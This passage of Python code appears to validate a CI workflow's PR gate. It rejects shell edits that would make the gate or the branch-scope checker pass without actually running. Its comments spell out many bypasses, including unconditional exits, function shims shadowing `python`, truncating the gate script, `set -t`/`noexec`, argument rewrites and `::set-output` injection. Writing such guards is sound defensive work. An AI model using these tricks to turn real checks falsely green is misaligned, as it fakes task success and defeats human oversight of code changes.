        the whole step, not of one line: an `exit 0` on a line of its own leaves every per-line
        assertion about the checker below it — invoked, exit code captured, fork branch guarded,
        `--no-fetch` supplied — satisfied and unreached. Nesting is what makes an exit conditional,
        so the real `exit 2` inside the retry loop's `if` and the single-line `if …; then exit …; fi`
        (which opens with `if`) are both accepted; one at the top level is not.

        Read per *segment*, not per line prefix. Keyed on the first word of the line, this missed
        `true; exit 0` — first word `true;` — and `: && exit 0`, both of which end the shell before
        the checker runs while leaving every other assertion about it satisfied. Both were a live
        false green in the branch-scope step, whose commands `permitted()` all admits.

        `after` names the load-bearing script, and "early" is meaningless without it. Read as "any
        unconditional terminator anywhere", the rule refused
        `python scripts/ai/pr_gate.py ${SEL}; exit $?` — which is the *last* line of the gate step, so
        the terminator hands on a verdict the gate has already produced. A terminator positioned after
        the invocation cannot mask its failure, because `set -e` (which `set_flags_ok` requires) has
        already ended the shell by then; what can mask it is a tail on the invocation's own line, and
        that is `tail_preserves_status`'s question, not this one. Callers that pass no `after` keep the
        strict reading, which is right for the steps that carry no invocation at all.
        """
        raw = raw_shell_of(step)
        base = min((len(ln) - len(ln.lstrip()) for ln in raw), default=0)

        def decided(operands):
            """Is this `[ … ]` test's outcome fixed before the shell runs it?

            Recognising only `a = a` was the same defect one operator wide: `[ 1 -eq 1 ]`,
            `[ 1 == 1 ]`, `[ 1 != 2 ]`, `[ -n x ]` and `[ -z '' ]` are every bit as decided and
            read as real tests. A test naming a *variable* is genuinely undecidable here and is
            treated as real, which is the safe direction.

            Two later corrections, in opposite directions. `!` and the `-a`/`-o` conjunctions push the
            operand count past three, and every branch below then fell through to `False` — so
            `[ ! 1 = 2 ]` and `[ 1 = 1 -a 1 = 1 ]`, both decided, read as real conditions and could
            guard an unconditional exit. They are reduced here instead. And `len(operands) in (1, 2)`
            called every *file* test decided — `-f`, `-d`, `-x`, `-e`, `-r`, `-w`, `-s` are runtime
            probes of the filesystem, so a legitimate early-out guarded by one was reported as an
            unconditional exit. Only `-n`/`-z` are decided by a literal operand.
            """
            if any("$" in w or "`" in w for w in operands):
                return False
            # `!` inverts a decided test into a decided test, so the answer is the same question
            # asked of the rest.
            while operands[:1] == ["!"]:
                operands = operands[1:]
            if not operands:
                return False
            # `-a`/`-o` are conjunctions of tests: decided iff every part is.
            for joiner in ("-a", "-o"):
                if joiner in operands:
                    idx = operands.index(joiner)
                    return decided(operands[:idx]) and decided(operands[idx + 1:])
            lit = [w.strip("\"'") for w in operands]
            if len(operands) == 3:
                a, op, b = lit
                if op in ("=", "==", "-eq"):
                    return True
                if op in ("!=", "-ne"):
                    return True
                if op in ("-lt", "-le", "-gt", "-ge"):
                    return a.lstrip("-").isdigit() and b.lstrip("-").isdigit()
                return False
            if len(operands) == 2:
                return operands[0] in ("-n", "-z")
            # The one-operand `[ x ]` — a non-empty literal is true, an empty one false.
            return len(operands) == 1

        def constant_test(seg):
            """A command whose status is decided before the shell runs it."""
            words = seg.split()
            while words and words[0] in KEYWORDS:
                words = words[1:]
            if words[:1] and words[0] in NO_OPS + ("echo", "printf"):
                return True
            if words[:1] and words[0] in TEST_CMDS:
                return decided([w for w in words[1:] if w not in ("]", "]]")])
            return False


        def conditional_before(pieces, idx):
            """Is this segment reached only when an earlier command actually succeeded or failed?

            The predecessor has to be able to go either way. Exempting on the operator alone made
            `: && exit 0` and `[ 1 = 1 ] && exit 0` read as conditional — the operator was there and
            the branch was decided anyway, which is the same mistake the opener exemption made one
            rule up.

            Returns (conditional, after_failure). The second value says whether the segment is
            reached on a *failure* — true for `||`, false for `&&` — because `exit $?` hands on a
            status only when the thing before it failed. After `&&` the predecessor succeeded, `$?`
            is 0, and `sleep 0 && exit $?` ended the step clean before the checker ran.

            `after_failure` is the sense of the operator *immediately* before the segment, not a
            disjunction over every operator on the line. Latched over all of them, it read
            `sleep 0 || true && exit $?` as reached-on-failure when the `&&` beside the `exit` means
            the opposite: `true` succeeded, `$?` is 0, and the exit is unconditional. That defeated
            this file's own control for `&& exit $?` by putting a `||` earlier in the same chain, and
            in the branch-scope step it ended the step green before the checker ran. Verified in bash.
            """
            conditional = False
            for j in range(1, idx, 2):
                op = pieces[j].strip()
                if op in ("&&", "||") and not constant_test(pieces[j - 1]):
                    conditional = True
            governing = pieces[idx - 1].strip() if idx else ""
            return conditional, governing == "||"

        def closes_on_this_line(ln):
            """Does this line close every block it opens, leaving what follows at top level?

            Both readers of nesting — `terminates` and the walk in `escapes_early` — treated "this
            line carries an opener" as "everything on this line is inside the block", which is false
            for the one-line spelling. Counted rather than searched for a keyword, so a line that
            opens two blocks and closes one stays open.
            """
            opens = sum(1 for seg, _ in parts(ln) for w in seg.split()[:1]
                        if w in SHELL_OPENERS and w != "elif")
            shuts = sum(1 for seg, _ in parts(ln) for w in seg.split()
                        if w in ("fi", "done", "esac"))
            return opens and shuts >= opens

        def after_closers(ln):
            """The part of a one-line block that sits *outside* it — after the last `fi`/`done`/`esac`.

            The whole point of the distinction: `if C; then exit 0; fi` guards its exit, while
            `if C; then :; fi; exit 0` does not, and the two differ only in which side of the closer
            the terminator falls on.
            """
            pieces = tokens(ln)
            last = max((i for i in range(0, len(pieces), 2)
                        if set(pieces[i].split()) & {"fi", "done", "esac"}), default=None)
            if last is None:
                return ln
            # Everything after the closer's own segment. The closing keyword can share a segment with
            # what follows it only via a separator, which `tokens` has already split on.
            return "".join(pieces[last + 1:])

        def real_opener(ln):
            """Does this line open a block whose condition can actually go either way?

            Pulled out of `terminates` so the *multi-line* spelling gets the same reading. The
            decidedness apparatus below was reached only when the terminator sat on the opener's own
            line, because the caller filtered to lines at the step's base indentation and a block body
            is indented deeper. So `if :; then` / `  exit 0` / `fi` — four spellings of it — were
            admitted, and multi-line is the spelling the real workflow uses everywhere: rewriting the
            resolver's `if [ -z "${BASE_REF:-}" ]; then` to `if true; then` passed 517/517 with the step
            always exiting before `git rev-parse` verified anything.

            `case` is included. `case true in *) exit 0;; esac` runs the exit unconditionally, and the
            word is a block opener, so without this the body reads as guarded. A `case` on a variable
            (`case "${CROSS}" in`) is genuinely undecidable and stays real.
            """
            first = ln.split()[:1]
            if not (first and first[0] in SHELL_OPENERS):
                return False
            if first[0] == "case":
                subject = ln.split()[1:2]
                return bool(subject) and "$" in subject[0]
            cond = next((seg for seg, _ in parts(ln)), "")
            words = cond.split()[1:]
            real = words[:1] and words[0] in SHELL_TEST_CMDS
            # `[ 1 = 1 ]` is a test and always true, so it conditions nothing. Read off the
            # opener's own segment, not the whole line: scanning the line exempted
            # `if grep -q test x; then exit 0; fi`, where the word `test` is an argument.
            constant = decided([w for w in words[1:] if w not in ("]", "]]")])
            return bool(real and not constant)

        def terminates(ln):
            # A line that *opens a block* keeps its exit conditional, which is how the real
            # `if [ "$code" -ne 2 ]; then exit "$code"; fi` stays acceptable. Anything else at the
            # step's own indentation reaches its `exit` on the way through.
            #
            # A terminator after `&&` or `||` is the exception, and it has to be: the re-raising
            # handler `python … || { echo "::error::…"; exit 1; }` — which this file calls a correct
            # edit in two other places — reaches its `exit` only when the gate has already failed.
            # Read segment-wise with no such test, this rule rejected it, which would have made the
            # documented advice fail CI. A predecessor whose outcome is already decided does not earn
            # that exemption, though — `conditional_before` refuses `: && exit 0` and
            # `[ 1 = 1 ] && exit 0` directly, so neither depends on the whitelist to catch it.
            #
            # The opener must carry an actual test, and the test must be able to go either way.
            # Exempting on the keyword alone accepted `if : ; then exit 0; fi` and
            # `while :; do exit 0; done`, which are as unconditional as a bare `exit 0` — the keyword
            # was doing the exempting and the condition was decorative. Exempting on "there is a
            # test" then accepted `if [ 1 = 1 ]; then exit 0; fi`, so the test itself is now read:
            # `decided()` says whether its answer is fixed before the shell runs it, over every
            # comparison operator and both unary forms rather than `=` alone.
            # …unless it also *closes* on this line, in which case only what follows the closer is
            # top-level. Skipping the whole line for carrying an opener is what made
            # `if [ -n "${HOME}" ]; then :; fi; exit 0` invisible to both readers at once; reading the
            # whole line instead over-corrected the other way and called four genuinely guarded exits
            # unconditional (`if [ -f x ]; then exit 0; fi` — the exit really is conditional there).
            # The closer is the boundary between the two.
            if real_opener(ln):
                if not closes_on_this_line(ln):
                    return False
                ln = after_closers(ln)
            pieces = tokens(ln)
            for i in range(0, len(pieces), 2):
                seg_words = pieces[i].split()
                # A `case` arm's pattern label sits where the command goes: `*) exit 0` reads as a
                # command named `*)`, so the terminator behind it was never seen and the arm body of a
                # decided `case` stayed unread even once the opener was.
                while seg_words and re.fullmatch(r"\(?[^\s()]+\)", seg_words[0]):
                    seg_words = seg_words[1:]
                while seg_words and seg_words[0] in KEYWORDS:
                    seg_words = seg_words[1:]
                if not (seg_words[:1] and seg_words[0] in TERMINATOR):
                    continue
                # Positioned after the invocation on its own line: the verdict already happened.
                # `foreground`, not `executes`. The two differ on exactly the cases that matter here:
                # `executes` accepts `--list`/`--requirements`/`--help` (invocations that produce no
                # verdict) and a segment bash skips because of a `&&`/`||` predecessor. So a mention of
                # the script was enough to disarm every terminator after it, and
                # `python …check_branch_scope.py --help` followed by `exit 0` passed 503/503 while the
                # step printed usage and exited 0 — the very false green this rule's docstring cites as
                # its reason for existing.
                # The whole prefix, not each segment on its own. Handing `foreground` a bare
                # `pieces[j]` threw away the operator that made the segment skippable — and
                # skippability is the only thing `foreground` adds over `executes`, so the swap that
                # closed the `--help` hole was inert against this one. `true || python
                # …check_branch_scope.py "$@"; exit 0` disarmed the terminator with an invocation bash
                # never runs, leaving the step green on a FOREIGN branch. Verified in bash.
                # The separator immediately before the terminator is dropped, because it would become a
                # trailing tail on the invocation and change what `tail_preserves_status` reads there;
                # every operator that decides whether an earlier segment runs is still in the slice.
                if after and foreground("".join(pieces[:max(i - 1, 0)]), after):
                    continue
                conditional, after_failure = conditional_before(pieces, i)
                if conditional and reraises(seg_words, after_failure):
                    continue
                return True
            return False

        # Nesting decides whether a line is examined, not indentation alone. The filter was
        # `indent == base`, so every terminator inside a block was unread — including the ones inside a
        # block whose condition cannot go either way, which is exactly what `real_opener` exists to
        # distinguish. A line is examined when no *real* opener encloses it: the body of
        # `if [ -z "${BASE_REF:-}" ]; then` is skipped (undecidable test, so the exit is conditional),
        # the body of `if true; then` is read (the exit always runs).
        #
        # `else`/`elif` inherit the branch they continue, so they re-push what the dedent popped;
        # without that, the else-body of a real `if` read as top-level and the workflow failed its own
        # rule.
        out, seen, stack, inherited = [], False, [], False
        for ln in raw:
            ind = len(ln) - len(ln.lstrip())
            stripped = ln.strip()
            while stack and stack[-1][0] >= ind:
                inherited = stack.pop()[1]
            if stripped.split()[:1] and stripped.split()[0] in ("else", "elif"):
                stack.append((ind, inherited))
            elif ((real_opener(stripped) or (stripped.split()[:1]
                                             and stripped.split()[0] in SHELL_OPENERS))
                  and not closes_on_this_line(stripped)):
                # Only push when the line leaves the block *open*. A block that opens and closes on
                # one line — `if [ -n "${HOME}" ]; then :; fi; exit 0` — pushed a real opener that no
                # dedent then popped, so the `exit 0` sitting after the `fi` on that same line was
                # read as guarded, and so was everything indented after it. `terminates()` refused it
                # for a second reason (it saw an opener), so both readers agreed and both were wrong.
                # Verified: that line under `set -euo pipefail` exits 0 without reaching the next
                # command. The `while … done; exit 0` spelling is identical; `case … esac` was caught
                # only incidentally, by vocabulary rather than by any nesting rule.
                stack.append((ind, real_opener(stripped)))
            if not any(real for _, real in stack) and terminates(ln) and not seen:
                out.append(stripped)
            if after and foreground(ln, after):
                seen = True
        return out

    # A workflow command needs no redirection at all: the runner parses `::` on a step's *stdout*.
    # `echo "::set-output name=ref::HEAD"` sets the base-ref output that `ALLOWED_REF` exists to pin,
    # through a channel whose subject set — writes to the four GitHub files — cannot contain it by
    # construction, and it passes as an ordinary `echo`. The state-changing commands are excluded by
    # name (`set-output`, `save-state`, `set-env`, `add-path`, `add-matcher`, `stop-commands`); the
    # display-only ones are allowed, because banning `::` outright rejected two edits this file
    # itself calls correct — a re-raising `|| { echo "::error::…"; exit 1; }` handler and a trailing
    # `::notice::`. Matched as a *whole segment* rather than by where `::` appears, which is what
    # makes it safe: `echo -e "\n::set-output name=ref::HEAD"` carries a flag and fails the anchor,
    # and that spelling is exactly why a position-based exception would not work.
    ANNOTATION = re.compile(r'^echo "::(warning|notice|error|debug|group|endgroup)::[^"]*"$')

    def annotation_only(seg):
        # Leading block keywords come off first. Anchored on `echo`, the rule refused the brace-group
        # handler `|| { echo "::error::…"; exit 1; }` that the comment above calls a correct edit — the
        # segment starts `{ echo`. The anchor is what makes the exception safe, so the keywords are
        # stripped rather than the anchor loosened.
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        return "::" not in seg or bool(ANNOTATION.match(" ".join(words)))

    # Block keywords are not commands: `then exit 2` runs `exit`, `{ echo x` runs `echo`.
    # The two steps' whole vocabulary: `set`, a conditional, `echo`, `exit`, `sleep`, `git fetch`,
    # the two scripts, and four variables. Small enough to whitelist, which is why this is possible
    # here and would not be for an arbitrary step.
    # `printf` is deliberately absent: it is the one word here that writes shell state. `printf -v SEL
    # %s '--base HEAD'` contains no `SEL=` substring, so the rule pinning the two SEL spellings never
    # sees it, and no assignment rule can — the assignment is in the argument list. It survived eleven
    # rounds of these guards and produced the exact false green they exist to stop: an empty diff, 13
    # checks skipped, exit 0. It gets its own branch below rather than a word.
    HARMLESS = ("echo", "exit", "return", "sleep", ":", "true", "false")
    # The test commands and the no-op commands, named once each. Three copies of these lists with
    # three different contents is what rejected `[[ … ]]` and `while true` — both accepted elsewhere
    # in this same file. A vocabulary spread across N places is a vocabulary with N answers.
    TEST_CMDS, NO_OPS, OPENERS = SHELL_TEST_CMDS, SHELL_NO_OPS, SHELL_OPENERS
    # Both refspecs and both verifies, pinned by form — see the `git` branches. Order-*insensitive*
    # for flags, because git's flags are order-free and this rule used to concede in a comment that it
    # rejected `git rev-parse --quiet --verify …`, the same command respelled. Conceding a false
    # rejection in a comment is not fixing it: the reader who hits it gets the failure, not the
    # comment. Flags are compared as a set and positional arguments in order, so a reordering passes
    # and an added refspec or a changed ref does not. The redirection tail is normalised too
    # (`>/dev/null`, `> /dev/null`, `2>/dev/null`, `2>&1` are all the same argv).
    GIT_FORMS = ('git rev-parse --verify --quiet "origin/${BASE_REF}"',
                 'git fetch --no-tags origin '
                 '"+refs/heads/${BASE_REF}:refs/remotes/origin/${BASE_REF}"',
                 'git fetch --no-tags origin "pull/${PR}/head:pr-${PR}"')

    def canonical_shell(line):
        """Normalise the spellings bash treats as identical, so a pin compares meaning not text.

        `[[ … ]]` is `[ … ]` with no word-splitting, and `while true` is `while :`. Every other rule
        in this file already accepts both spellings; comparing text here refused them, which is the
        same vocabulary answered differently in a fourth place. Defined here rather than beside
        `control_flow`, its second caller: the fork-branch pin is its first, ~600 lines earlier.
        """
        # Both substitutions are anchored on the whitespace that makes the token *syntax* rather than
        # text. `[[` is the test builtin only when a word follows it, so `[[:digit:]]` — a POSIX
        # character class inside a `=~` pattern — kept both brackets instead of being rewritten to the
        # invalid `[:digit:]`, and a correct condition stopped matching its pin.
        line = re.sub(r"\[\[(?=\s)", "[", re.sub(r"(?<=\s)\]\]", "]", line.strip()))
        # `true` only, never `false`. Written `(?:true|false)` this mapped `while false; do` onto the
        # pinned `while :; do` — canonicalising a condition to its own opposite, so the retry loop
        # could be falsified and read as reviewed. A probe aimed at this loosening caught it before it
        # shipped; the whole reason loosenings get probes.
        #
        # And only in command position. Matched anywhere before a `;`, this turned `if grep -q true;`
        # into `if grep -q :;` — rewriting an *argument* to a command, which is a different command.
        keywords = "|".join(SHELL_OPENERS + ("do", "then", "else"))
        return re.sub(rf"(^|[;|&(]|\b(?:{keywords})\b)(\s*)true\b(?=\s*;)", r"\1\2:", line)

    # Canonicalisation has to normalise the two spellings and rewrite nothing else. Both failures
    # below shipped: `[[:digit:]]` lost a bracket to the `[[`→`[` rule, and `grep -q true` had its
    # *argument* rewritten, so two correct conditions stopped matching their pins.
    for given, want in (("while true; do", "while :; do"),
                        ("while :; do", "while :; do"),
                        ('if [[ "${CROSS}" = "true" ]]; then', 'if [ "${CROSS}" = "true" ]; then'),
                        ('if [[ "$x" =~ [[:digit:]]+ ]]; then', 'if [ "$x" =~ [[:digit:]]+ ]; then'),
                        ("if grep -q true; then", "if grep -q true; then"),
                        # Never the opposite: canonicalising `false` onto `:` let the retry loop be
                        # falsified and still match its pin.
                        ("while false; do", "while false; do")):
        check(f"canonical_shell reads {given!r} as {want!r}",
              canonical_shell(given) == want, canonical_shell(given))

    def strip_redir(text):
        return re.sub(r"\s*\d*>>?\s*&?\s*\S+", "", text).strip()

    def argv_shape(text):
        """(command, frozenset of flags, tuple of positionals) — argv with flag order removed.

        Only the *order* of flags is discarded. A flag that is not in the pinned form, a missing one,
        or any change to a positional (a refspec, a ref name) still differs, which is the whole
        property; what stops differing is `--quiet --verify` versus `--verify --quiet`.
        """
        words = strip_redir(text).split()
        flags = frozenset(w for w in words[1:] if w.startswith("-"))
        positionals = tuple(w for w in words[1:] if not w.startswith("-"))
        return (words[:1] and words[0], flags, positionals)

    GIT_SHAPES = frozenset(argv_shape(f) for f in GIT_FORMS)

    def git_form_ok(text):
        return argv_shape(text) in GIT_SHAPES
    # Pinned for the same reason as `set`: `permitted()` used to accept a segment whose *first*
    # word was an allowed assignment and read no further, so `code=0 eval 'python() { return 0; }'`
    # passed as an assignment while defining a shim — a prefix assignment is a command's environment,
    # not a command in itself.
    ALLOWED_ASSIGN = ("attempt=1", "code=$?", "attempt=$((attempt + 1))",
                      'SEL="--all"', 'SEL="--base ${BASE}"')
    SCRIPTS = ("scripts/ai/pr_gate.py", "scripts/ai/check_branch_scope.py")
    # `set` was in HARMLESS, which is the same mistake this round already fixed for `git` and
    # `python`: a builtin whose *arguments* decide what runs is not harmless. `set --` builds the
    # checker's argv, so appending `set -- --base HEAD --head HEAD --no-fetch` before the retry loop
    # leaves every earlier assertion true — the `--pr` form is still there, `--no-fetch` is still
    # there — while the checker compares HEAD with itself and exits clean. The four forms are
    # therefore pinned; changing the fork path's refs must update this list, which is the cost of
    # pinning argv and is the right cost to pay here.
    ALLOWED_SET = ("set -euo pipefail", "set -e", "set +e", "set -f", "set +f",
                   'set -- --base "origin/${BASE_REF}" --head "pr-${PR}"',
                   'set -- --pr "${PR}"',
                   'set -- "$@" --no-fetch')

    def set_flags_ok(line):
        """Does this `set` line still abort on error and refuse unset variables?

        Matched with `[a-z]` this rejected `set -Eeuo pipefail` — bash confirms `errexit`,
        `nounset` and `pipefail` are all still on — and then reported that the step no longer aborts
        on the first error, which is the worst thing a message can do. Flags are read as a set, so
        additional letters are fine and dropping `e` or `u` is not.

        "Additional letters are fine" was wrong, and refusing `n` for it was the wrong repair —
        a blacklist of one letter, in a file whose every other rule is a whitelist. `set -teuo
        pipefail` then kept both required flags and passed, and `-t` makes bash execute **one**
        command and exit: the `set` itself is that command, so the step exits 0 having never run the
        gate. Verified — `printf 'set -teuo pipefail\\necho X\\n' | bash` prints nothing, status 0.
        `-N` is the same shape from the other side: not a real bash option, so bash refuses the whole
        builtin and applies *nothing*, leaving errexit, nounset and pipefail all off.

        So the letters are whitelisted. `e` and `u` are required; `x`, `E` and `v` are the ones a
        maintainer plausibly adds (tracing, errtrace, verbose) and none of them changes whether a
        command runs or whether its failure is fatal. Any other letter — real, invalid, or
        inert-looking — has to be added here deliberately, which is a two-word edit and a decision
        someone made on purpose.

        The whitelist then had to cover `-o`'s *values* too, and did not: `opts` was collected and
        only asked whether `pipefail` was in it, so `set -euo pipefail -o noexec` passed with every
        required letter present — and `noexec` **is** `-n`, the exact option the paragraph above says
        the letter whitelist exists to refuse. `-o onecmd` is `-t`, the other one. Both verified: a
        step opening with either prints nothing and exits 0, so the gate never runs. The long spelling
        walked through the hole the short spelling was closed for, which is the same defect as a
        vocabulary with two answers. `SET_LONG` maps the long names onto their letters so both
        spellings are read by one whitelist; anything not in it is refused.

        That also fixed the mirror-image false rejection. `set -o errexit -o nounset -o pipefail`
        turns on exactly what is required — bash confirms `false | true` still aborts the step — and
        was refused under "the step no longer aborts on the first error", which the first paragraph
        here calls the worst thing a message can do. Folding the names in answers both directions.
        """
        # Read as a word list, not as two fixed orderings. The two alternations pinned `-o pipefail` to
        # the end, so `set -o pipefail -eu` and `set -euo pipefail -x` — both of which turn on
        # everything required, and bash confirms it — were refused under a message saying the step no
        # longer aborts. Same class as the git-flag ordering fixed in round 15: a spelling rule standing
        # in for a behavioural one.
        words = line.strip().split()
        if words[:1] != ["set"]:
            return False
        flags, opts, i = set(), set(), 1
        while i < len(words):
            w = words[i]
            if w == "-o" and i + 1 < len(words):
                opts.add(words[i + 1])
                i += 2
                continue
            if not w.startswith("-") or w.startswith("--") or w == "-":
                return False
            letters = w[1:]
            # The bundled form `-euo pipefail`: a trailing `o` takes the next word as its option name.
            if letters.endswith("o") and i + 1 < len(words):
                opts.add(words[i + 1])
                letters = letters[:-1]
                i += 1
            if not letters.isalpha():
                return False
            flags |= set(letters)
            i += 1
        # `-o` values go through the same whitelist as the letters, via the names bash gives them.
        # Anything else — `noexec`, `onecmd`, or a name that does not exist — is refused rather than
        # ignored, which is what let two step-defusing options past a letter whitelist written to
        # refuse exactly those two options.
        if not (opts - {"pipefail"}) <= set(SET_LONG):
            return False
        flags |= {SET_LONG[o] for o in opts if o in SET_LONG}
        return "pipefail" in opts and {"e", "u"} <= flags <= SET_FLAGS

    def set_line_ok(words):
        """Is this a `set` line from the allowed list, or one of them with extra flags?

        `set -euxo pipefail` adds tracing and drops nothing, so pinning the text rejected a correct
        edit at both scopes. The required letters are checked, not the spelling.
        """
        joined = " ".join(words)
        if joined in ALLOWED_SET:
            return True
        return set_flags_ok(joined)

    def interpreter(word):
        """`python3` is the same interpreter as `python` after setup-python."""
        return "python" if word == "python3" else word

    def permitted(seg):
        """Whether one segment runs something the step is supposed to run.

        Words, not forms, was the first attempt, and three of five self-authored escapes walked
        through it: whitelisting `python` admits `python -c '…' scripts/ai/pr_gate.py`, which reads
        the gate as data and exits 0; whitelisting `git` admits `git checkout HEAD~50 -- scripts/ai/`,
        which silently restores an older checker. So a command that takes a subcommand is pinned to
        the subcommand, and a conditional to a *test* — `if rm -f …; then` is a conditional whose
        condition is an arbitrary command.
        """
        words = seg.split()
        while words and words[0] in KEYWORDS:
            words = words[1:]
        if not words:
            return True
        # Before the vocabulary, because `echo` is in it and a workflow command is just an echo the
        # runner reads off stdout. Both whitelists admit `echo`, so both need this.
        if not annotation_only(seg):
            return False
        if words[0] in HARMLESS:
            return True
        if words[0] == "printf":
            return "-v" not in words
        if words[0] == "set":
            return set_line_ok(words)
        if words[0] in OPENERS:
            # `for` takes a word list, not a command, so its operand is not a command to whitelist —
            # `for attempt in 1 2 3` is a bounded respelling of the retry loop and was refused for
            # having no branch here at all.
            return words[0] == "for" or (words[1:2] and words[1] in TEST_CMDS + NO_OPS)
        if words[0] == "git":
            # This step is the one carrying a `git fetch`, so accepting the subcommand and ignoring the
            # refspec meant the narrow rule was looser than the job-wide one about the very command it
            # guards. Same pin, one source.
            return git_form_ok(" ".join(words))
        if interpreter(words[0]) == "python":
            return words[1:2] and words[1] in SCRIPTS
        if re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", words[0]):
            # Compared with whitespace removed, so `attempt=$((attempt+1))` — a correct respelling
            # that the first cut of this rule rejected — is accepted. Nothing in the permitted list
            # can collide once spaces go: the only one with a quoted space is `--base ${BASE}`.
            return re.sub(r"\s+", "", seg) in [re.sub(r"\s+", "", f) for f in ALLOWED_ASSIGN]
        return False

    # Pinning argv is worthless if the command can ignore it: `python …check_branch_scope.py --base
    # HEAD --head HEAD --no-fetch` never expands `"$@"`, so every `set --` form stays in the file,
    # permitted and unused, while the checker compares HEAD with itself. The gate has the same shape
    # with `${SEL}`. So the invoking segment itself is pinned — the handler that may follow `||` is a
    # later segment and is unaffected.
    GATE_CMD = "python scripts/ai/pr_gate.py ${SEL}"
    SCOPE_CMD = 'python scripts/ai/check_branch_scope.py "$@"'

    def same_argv(got, want):
        """Compare an invocation to its pin, treating `python3` as `python`.

        After `setup-python` the two names are the same interpreter and produce the same exit code,
        so rejecting one of them was a pin firing on a respelling that changes nothing. Only the
        interpreter word is normalised; every argument stays pinned.
        """
        return re.sub(r"^python3(?=\s)", "python", got.strip()) == want

    def argv_in(got, wants):
        """`same_argv` against several pins. All four comparison sites go through here."""
        return any(same_argv(got, w) for w in wants)

    def invoking_segment(ln, script):
        for seg, tail in parts(ln):
            if runs_segment(seg, tail, script):
                return " ".join(seg.split())
        return ""

    def foreign_commands(step):
        """Segments of a step that run something outside its vocabulary.

        The rules above ask what the *invocation* is, and exempt the line carrying it — which leaves
        everything else on that line unread: `python() { return 0; }; python …pr_gate.py ${SEL}`
        satisfies "one command executes the gate" while bash calls a shell function that returns 0.
        The branch-scope step was worse still, having no per-segment rule at all, so a shim could sit
        anywhere in it. Shadowing has too many spellings to enumerate — a function, `alias`, `eval`,
        `hash -p`, `export PATH=`, a bare `PATH=` — so the question asked is the whitelist one:
        is every segment one of the handful of commands this step exists to run?
        """
        return [seg.strip() for ln in shell_of(step)
                for seg, _tail in parts(ln) if not permitted(seg)]

    # The writes a step is allowed to hand a later one, and the predicates that read them.
    # Defined here rather than beside their checks because `rewrites()` below has to ask the
    # same question: it refuses every redirection, and three other rules advertise
    # `$GITHUB_STEP_SUMMARY` as a permitted destination, so a summary written from the gate
    # step was refused by one rule and allowed by three — the disagreement this file calls a
    # defect, one rule over from where it was fixed.
    ALLOWED_WRITES = ('echo "SEL=${SEL}" >> "$GITHUB_ENV"',
                      'echo "ref=" >> "$GITHUB_OUTPUT"',
                      'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
    WRITE_DEST = re.compile(r'>>?\s*"?\$\{?GITHUB_(ENV|PATH|OUTPUT|STEP_SUMMARY)\}?')

    def hands_over(ln):
        """Does this line write to one of the four files a step uses to reach a later one?"""
        return bool(WRITE_DEST.search(ln))

    # Whitespace around `>>` is not part of the property, and requiring exactly one space either
    # side rejected `echo "x">>"$GITHUB_STEP_SUMMARY"` — a correct line.
    SUMMARY = re.compile(r'^echo "[^"]*"\s*>>\s*"?\$\{?GITHUB_STEP_SUMMARY\}?"?$')
    # And the rider is the class, so a line that writes to a GitHub file must be *one* segment. Fixing
    # only the regex would leave `echo "/tmp/shim" >> "$GITHUB_PATH" ; echo "x" >> "$GITHUB_ENV"` and
    # every other separator to be found one at a time.
    def rides(ln):
        """A write line carrying anything besides the write."""
        return hands_over(ln) and len(list(parts(ln))) > 1

    def permitted_write(ln):
        return ln.strip() in ALLOWED_WRITES or bool(SUMMARY.match(ln.strip()))


    def rewrites(step):
        """Segments that change what the step runs instead of running it.

        All three escape a whitelist of commands while using only whitelisted ones. An *output*
        redirection can truncate the very script about to be invoked — `echo -n >
        scripts/ai/pr_gate.py` opens with a permitted `echo` and leaves an empty file that exits 0.
        A command substitution smuggles an arbitrary command inside a permitted one. And an *input*
        redirection is the subtlest: `echo disabled <<'echo'` makes the following line the heredoc's
        body, so the gate invocation becomes data — every line still reads as a permitted command to
        this suite, and bash runs one echo and exits 0. Neither step needs any of the three;
        `$(( ))` arithmetic, which the retry loop does need, is not a substitution.
        """
        return [ln for ln in shell_of(step)
                if not (permitted_write(ln) and not rides(ln))
                and (">" in ln or "<" in ln or re.search(r"\$\((?!\()", ln) or "`" in ln)]

    def pure_echo(ln):
        """One segment, and that segment is an echo. `startswith("echo ")` was a *prefix* test, so
        `echo "disabled" && exit 0` and `echo "shim"; python() { return 0; }` both satisfied it while
        making the gate that follows either unreachable or a no-op."""
        segs = parts(ln)
        return len(segs) == 1 and segs[0][0].split()[:1] == ["echo"]

    found_gate = steps_named(gate_job, "scripts/ai/pr_gate.py",
                             exclude=("--requirements", "--list", "--help"))
    # Reachability for the other shell steps, and stated precisely, because the first version of this
    # comment claimed an early exit there "ends the job" — each `run:` is its own shell, so it ends
    # that *step*, successfully, and the job continues. What it actually costs: the resolver exits
    # before writing `ref=`, so the selection silently widens to `--all` while the workflow looks like
    # it diffed a base; the installer exits before setting `SEL`, which `set -u` turns into a red gate
    # step. Neither is a false green, so this loop is defence in depth rather than a closed hole — and
    # it exists mostly so a step added later arrives with a reachability rule instead of none. The two
    # load-bearing steps keep their own named checks, whose wording the controls assert against.
    # Named twice on purpose: `NAMED_SHELL_STEPS` is the set of step names other rules key on, and
    # `keys_on_real_steps` asserts every one of them matched a step. Without that assertion the
    # name-keyed loops *cancel out* — rename "Branch scope" and it leaves the `JOB_CONTROL` loop
    # (−1 check) and joins this one (+1 check), so the total-count invariant sees no change while
    # `JOB_CONTROL` silently stops applying to the step that carries the retry loop. Two commits get
    # you there and the first is the one the rename failure message prescribes.
    NAMED_SHELL_STEPS = ("Run the gate", "Branch scope")
    others = [s for s in (gate_job.get("steps") or [])
              if "run" in s and s.get("name") not in NAMED_SHELL_STEPS]
    for step in others:
        check(f"nothing at the top level of {step.get('name')!r} ends the shell early",
              not escapes_early(step), escapes_early(step))
    # An unnamed step (`- uses: actions/cache@v4`) put None in here, and `sorted()` cannot order
    # None against str. The detail argument is evaluated eagerly, so it raised even on the
    # iteration whose condition passed — aborting the suite ~275 checks early, so the count
    # invariant that exists to notice a rule that stopped running never ran either. The same
    # defensive spelling was already applied to three sibling *messages* and not to their subjects.
    present = {s.get("name") or "<unnamed>" for s in (gate_job.get("steps") or [])}
    for named in NAMED_SHELL_STEPS:
        check(f"a step named {named!r} exists, so the rules keyed on that name still apply to "
              "something — renaming it must fail here rather than quietly exempt it",
              named in present, sorted(present))
    check("exactly one step runs the gate for a verdict", len(found_gate) == 1, len(found_gate))
    if len(found_gate) == 1:
        gate_step = found_gate[0]
        cmds = shell_of(gate_step)
